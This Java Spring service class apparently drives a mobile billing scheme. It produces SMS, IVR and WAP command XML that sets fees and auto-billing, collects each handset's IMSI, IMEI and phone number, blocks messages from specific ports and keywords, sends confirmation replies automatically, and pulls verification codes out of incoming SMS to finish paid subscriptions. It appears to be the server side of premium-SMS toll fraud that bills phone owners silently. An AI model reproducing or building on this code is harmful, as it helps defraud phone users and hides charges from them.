package net.mimiduo.boot.service.impl.business;


import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;


import net.mimiduo.boot.common.util.TrimNumberUtils;
import net.mimiduo.boot.pojo.business.Channel;
import net.mimiduo.boot.pojo.business.ChannelProvince;
import net.mimiduo.boot.pojo.business.Sell;
import net.mimiduo.boot.pojo.business.Visit;
import net.mimiduo.boot.pojo.data.SendIvrXml;
import net.mimiduo.boot.pojo.data.SendSmsXml;
import net.mimiduo.boot.pojo.data.SendWapXml;
import net.mimiduo.boot.service.busindess.ChannelProvinceService;
import net.mimiduo.boot.service.busindess.ChannelService;
import net.mimiduo.boot.service.busindess.CompanyService;
import net.mimiduo.boot.service.busindess.SendXmlService;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import java.util.List;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

@Service
public class SendXmlServiceImpl  implements SendXmlService {

    private static final Logger LOGGER = LoggerFactory.getLogger(SendXmlServiceImpl.class);

    @Autowired
    private ChannelService channelService;

    @Autowired
    private ChannelProvinceService channelProvinceService;

    @Autowired
    private CompanyService companyService;


    //下发销量
    @Override
    public String sendSell(Visit visit){
        Random random=new Random();
        final int serviceType=7;
        List<Channel> channelList=this.channelService.findByServiceType(serviceType);
        Channel channel=channelList.get(random.nextInt(channelList.size()));
        SendSmsXml sendSmsXml=new SendSmsXml();
        StringBuilder smsContent = new StringBuilder();
        smsContent.append("0MTK10A10321000+").append(visit.getClientId()).append("+" + visit.getProjectId())
                .append("+" + visit.getSmsc().replace("+", "") + "+").append(visit.getImsi());
        sendSmsXml.setCcmd_cust(smsContent.toString());
        sendSmsXml.setCnum_cust(channel.getSpnumber());
        sendSmsXml.setAutofee("101");
        sendSmsXml.setFee("1");
        sendSmsXml.setFeemode("11");
        return sendSmsXml.toString();

    }

    /***
     * 下发通道
     * @param sell
     * @param channel
     * @param total
     * @return
     */
    @Override
    public String sendXml(Sell sell, Channel channel, int total) {
        String cmd = setChannelCmd(channel, sell);
        ChannelProvince channelProvince = this.channelProvinceService.findByProvinceIdAndChannelId(sell.getProvince(), channel.getId());
        String str = getTemp(channel, sell, channelProvince, 1, total, cmd);
        return str;
    }

    private String getIvrCmd(String cmd) {
        String[] s = cmd.split("\\|");
        if (s.length > 1) {
            String s1 = s[0];
            String s2 = s[1];

            String[] ss1 = s1.split("\\&");
            String[] ss2 = s2.split("\\&");
            Random random = new Random();

            return ss1[random.nextInt(ss1.length)] + "|" + ss2[random.nextInt(ss2.length)];
        } else {
            return cmd;
        }
    }

    private String getTemp(Channel channel, Sell sell, ChannelProvince pro, long daylimit, int total, String cmd) {
        if (channel.getFeeType() == 1) {
            SendSmsXml sendSmsXml = new SendSmsXml();
            sendSmsXml.setCnum_cust(channel.getSpnumber());
            sendSmsXml.setCcmd_cust(cmd);
            sendSmsXml.setCnum2_cust(channel.getSpnumber1());
            sendSmsXml.setPortShield(channel.getShieldPort());
            sendSmsXml.setFilter1_cust(pro.getShieldKeyword());
            sendSmsXml.setFee(String.valueOf(total));
            sendSmsXml.setAutofee((daylimit + 1) + "0" + channel.getIntervals());
            sendSmsXml.setFeemode(11 + "");
            sendSmsXml.setCreconfirm_cust(pro.getReplyContent());
            return sendSmsXml.toString();
        } else if (channel.getFeeType() == 2) {
            SendIvrXml sendIvrXml = new SendIvrXml();
            sendIvrXml.setAddr(channel.getSpnumber());
            sendIvrXml.setFeemode(31 + "");

            String[] cmdList = channel.getCmd().split("&");
            if (null != cmdList && cmdList.length > 0) {
                Random random = new Random();
                sendIvrXml.setCallTime(cmdList[random.nextInt(cmdList.length)]);
            } else {
                sendIvrXml.setCallTime(channel.getCmd());
            }

            sendIvrXml.setAutofee(daylimit + "0" + channel.getIntervals());
            String[] keyList = channel.getKeyContent().split(",");
            String ivrKey = "";
            if (null != keyList && keyList.length > 0) {
                int i = 0;
                for (String key1 : keyList) {
                    ivrKey += getIvrCmd(key1);
                    if (i < keyList.length - 1) {
                        ivrKey += ",";
                    }
                    i++;
                }
                sendIvrXml.setTimeKeys(ivrKey);
            } else {
                sendIvrXml.setTimeKeys(channel.getKeyContent());
            }
            sendIvrXml.setSMSKey(pro.getShieldKeyword());
            sendIvrXml.setCreconfirm_cust(pro.getReplyContent());
            sendIvrXml.setPortShield(channel.getShieldPort());
            return sendIvrXml.toString();
        } else if (channel.getFeeType() == 3) {
            SendWapXml sendWapXml = new SendWapXml();
            sendWapXml.setFeemode(40 + "");
            sendWapXml.setFilter1Cust(pro.getShieldKeyword());
            sendWapXml.setHasNext(channel.getIsExec());
            sendWapXml.setHasSync(channel.getIsSycn());
            sendWapXml.setNextOptType(channel.getVisitType());
            sendWapXml.setPortShield(channel.getShieldPort());
            sendWapXml.setSendType(String.valueOf(channel.getIsGet()));
            sendWapXml.setWaitTime(channel.getIntervals());
            sendWapXml.setWAPAPIUrl("/sms/reply?type=" + channel.getServiceType() + "&id=" + channel.getId()
                    + "&next=1&imsi=" + sell.getImsi());
            if (channel.getVisitType() == 1) {
                sendWapXml.setAddr("");
                sendWapXml.setCmd("");
                sendWapXml.setListUrl(setReplaceCmd(channel.getCmd(), sell));
            } else {
                sendWapXml.setAddr(channel.getSpnumber());
                sendWapXml.setCmd(setReplaceCmd(channel.getCmd(), sell));
                sendWapXml.setListUrl("");
            }
            return sendWapXml.toString();
        } else {
            return "";
        }
    }

    private String setChannelCmd(Channel channel, Sell sell) {
        if (channel.getServiceType() == 17) {
            String url = channel.getThirdCmd();
            url = url.replace("@imsi", sell.getImsi());
            String cmd = "";
            try {
                cmd = TrimNumberUtils.thirdApi(url,channel.getIsGet()==1?"POST":"GET");
                return cmd;
            } catch (Exception e) {
                LOGGER.debug(e.getMessage());
            }
            return cmd;
        }
        // if(channel.getServiceType()==18)
        return channel.getCmd();
    }

    private String setReplaceCmd(String url, Sell sell) {
        url = url.replace("@imsi", sell.getImsi()).replace("@mobile", sell.getMobile()).replace("@imei",
                sell.getImei());
        return url;
    }

    /***
     * 回复通道
     * @param channel
     * @param smsContent
     * @param jsonContent
     * @param next
     * @param sell
     * @return
     */
    @Override
    public String sendWapXml(Channel channel, String smsContent, String jsonContent, int next, Sell sell){
        String cmdString = "";
        String spnumberString = "";
        String cmdResult = "";
        ChannelProvince channelProvince = this.channelProvinceService.findByProvinceIdAndChannelId(sell.getProvince(),
                channel.getId());
        if (channel.getContentType(next) == 1 && !smsContent.trim().equals("")) { // 如果内容是文本
            cmdResult = setContent(smsContent, channel.getFlowControl(next));
            cmdString = setReplaceCmd(channel.getCmd(next), sell).replace("@vcode", cmdResult);
            spnumberString = channel.getSpnumber(next);
        } else if (channel.getContentType(next) == 2 && !jsonContent.trim().equals("")) { // 如果是JSON
            JSONObject jsonObject =  JSON.parseObject(jsonContent.toString());
            String[] keyStrings = channel.getFlowControl(next).split("\\|");
            cmdString = jsonObject.getString(keyStrings[0]);
            spnumberString = jsonObject.getString(keyStrings[1]);
        } else if (channel.getContentType(next) == 3 && !smsContent.trim().equals("")
                && !jsonContent.trim().equals("")) { // json|文本
            String[] keyStrings = channel.getFlowControl(next).split("\\|");
            cmdResult = setContent(smsContent, keyStrings[0]);
            JSONObject jsonObject = JSON.parseObject(jsonContent.toString());
            cmdString = setReplaceCmd(channel.getCmd(next), sell).replace("@vcode", cmdResult);
            for (int i = 1; i < keyStrings.length; i++) {
                cmdString = cmdString.replace("@" + keyStrings[i], jsonObject.getString(keyStrings[i]));
            }
        }
        if (cmdString.trim().equals("")) {
            SendWapXml wapXml = new SendWapXml();
            return wapXml.toString();
        } else {
            return setWapXml(channel, cmdString, spnumberString, next, sell.getImsi(), channelProvince);
        }
    }

    private String setWapXml(Channel channel, String cmd, String spnumber, int next, String imsi,
                              ChannelProvince channelProvince) {
        SendWapXml sendWapXml = new SendWapXml();
        sendWapXml.setFeemode(40 + "");
        sendWapXml.setFilter1Cust(channelProvince.getShieldKeyword());
        sendWapXml.setHasNext(channel.getIsExec(next));
        sendWapXml.setHasSync(channel.getIsSycn(next));
        sendWapXml.setNextOptType(channel.getVisitType(next));
        sendWapXml.setPortShield(channel.getShieldPort());
        sendWapXml.setSendType(String.valueOf(channel.getIsGet(next)));
        sendWapXml.setWaitTime(channel.getIntervals());
        sendWapXml.setWAPAPIUrl("/sms/reply?type=" + channel.getServiceType() + "&id=" + channel.getId() + "&next="
                + (next + 1) + "&imsi=" + imsi);
        if (channel.getVisitType(next) == 1) {
            sendWapXml.setAddr("");
            sendWapXml.setCmd("");
            sendWapXml.setListUrl(cmd);
        } else {
            sendWapXml.setAddr(spnumber);
            sendWapXml.setCmd(cmd);
            sendWapXml.setListUrl("");
        }
        return sendWapXml.toString();
    }

    private String setContent(String content, String key) {
        String urlString = "";
        String regex = key.replace("*", "(.*?)");
        Pattern pattern = Pattern.compile(regex);
        Matcher matcher = pattern.matcher(content);
        if (matcher.find()) {
            urlString = matcher.group(1);
        }
        return urlString;
    }


}
